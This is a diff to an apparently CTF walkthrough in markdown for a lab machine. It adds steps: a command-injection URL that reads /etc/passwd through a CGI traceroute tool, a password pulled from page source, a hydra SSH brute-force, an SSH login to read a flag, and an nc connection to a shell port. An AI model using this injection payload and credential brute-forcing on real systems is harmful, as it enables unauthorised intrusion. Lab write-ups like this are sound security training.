@@ -127,14 +127,50 @@ or
 ```bash
 http://< IP >/cgi-bin/tracertool.cgi?ip=%3B+tail+%2Fetc%2Fpasswd
 ```
+![rick webshell user](https://user-images.githubusercontent.com/112984045/202860602-49f96a83-2d49-4029-b0fa-7bf93cff1508.png)
 <br>
 
-* Now we have 3 usernames
+* Now we have 3 usernames ( make them as .txt file )
+* Go back to /passwords directory
+```bash
+view-source:http://< IP >/passwords/passwords.html
+```
+![rick winter](https://user-images.githubusercontent.com/112984045/202860873-559a2586-8503-4cf3-a9c4-2dfd936d413f.png)
+<br>
 
+* Here we go the password
+<br>
 
+```bash
+hydra -L < list of those 3 users > -p winter ssh://< IP >
+```
+![rick hydra 22222](https://user-images.githubusercontent.com/112984045/202861376-26a0c985-5836-416b-9d66-1a2189e70c49.png)
 
+<br>
 
+```bash
+ssh Summer@< IP > -p 22222
+```
+![rick sshlogin 22222](https://user-images.githubusercontent.com/112984045/202861474-8e7b38f2-3253-4910-b829-0a9cf8a27106.png)
 
+<br>
+
+```bash
+tail FLAG.txt
+```
+![rick 5ssh 22222](https://user-images.githubusercontent.com/112984045/202861564-a9bfb5a9-2ebd-4873-8936-baa214b7c8d5.png)<br>
+
+## `FLAG : 50`
+<br>
+
+<br>
+ * Lets go for port  6000
+ * As the scan states that it is an reverse shell
+ ```bash
+ nc < IP > 
+
+```
+![rick 4 port60000](https://user-images.githubusercontent.com/112984045/202861911-6f8a806c-85b2-46a3-a775-49f0a0798e54.png)
 
 
 
